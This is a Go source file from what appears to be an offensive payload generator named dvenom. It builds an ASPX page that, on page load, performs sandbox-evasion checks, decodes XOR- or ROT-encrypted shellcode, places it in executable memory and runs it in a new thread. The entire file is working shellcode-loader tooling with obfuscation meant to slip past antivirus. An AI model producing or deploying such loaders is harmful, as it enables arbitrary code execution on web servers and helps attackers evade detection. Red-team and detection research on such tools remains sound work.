package payloads

import (
	"bytes"
	"log"
	"text/template"

	"github.com/Zerx0r/dvenom/internal/cryptor"
	"github.com/Zerx0r/dvenom/internal/helpers"
)

func aspxMain() string {
	return `
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
	private static Int32 MEM_COMMIT=0x1000;
	private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

	[System.Runtime.InteropServices.DllImport("kernel32")]
	private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);
	[System.Runtime.InteropServices.DllImport("kernel32")]
	public static extern uint FlsAlloc(IntPtr lpCallback);
	[System.Runtime.InteropServices.DllImport("kernel32")]
	private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);
	[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
		uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
	[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	private static extern IntPtr GetCurrentProcess();
	protected void Page_Load(object sender, EventArgs e)
	{

		var mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
		if (mem == null)
		{
			return;
		}
		var result = FlsAlloc(IntPtr.Zero);
		if(result == 0xFFFFFFFF)
		{
			return;
		}

		byte[] buf = new byte[] { {{.Values.ShellCode}} };

		{{.Values.DecodeFunc}}

		IntPtr vEqpWqwq2D = VirtualAlloc(IntPtr.Zero,(UIntPtr)buf.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		System.Runtime.InteropServices.Marshal.Copy(buf,0,vEqpWqwq2D,buf.Length);
		IntPtr xhLY = IntPtr.Zero;
		IntPtr odlwUY0hhvv = CreateThread(IntPtr.Zero,UIntPtr.Zero,vEqpWqwq2D,IntPtr.Zero,0,ref xhLY);
	}
</script>
	`
}

func BuildAspxTemplate(methodType string, cipherType string, key string, shellCode []byte) string {

	field := helpers.Field{
		Values: make(map[string]string),
	}
	var value []byte
	switch cipherType {
	case "xor":
		value = cryptor.Xor(key, shellCode)
		field.SetValue("DecodeFunc", csharpXor(key))
	case "rot":
		value = cryptor.Rot(key, shellCode)
		field.SetValue("DecodeFunc", csharpRot(key))
	default:
		log.Fatalf("[x] Error: Cipher type %s is not supported with aspx payload. Supported types: (xor, rot)", cipherType)
	}
	field.SetValue("ShellCode", helpers.BytesToHexArray(value))
	switch methodType {
	case "valloc":
		return buildAspxTemplate(field, aspxMain())
	default:
		log.Fatalf("[x] Error: Method type %s is not supported in aspx payload. Supported types: (valloc)", methodType)
		return ""
	}
}

func buildAspxTemplate(field helpers.Field, vbaTemplate string) string {
	var buffer bytes.Buffer
	t, err := template.New("AspxTemplate").Parse(vbaTemplate)
	if err != nil {
		log.Fatal("[x] Error: Failed to generate aspx code.", err)
	}

	if err := t.Execute(&buffer, field); err != nil {
		log.Fatal("[x] Error: Failed to generate aspx code.", err)
	}
	return buffer.String()
}
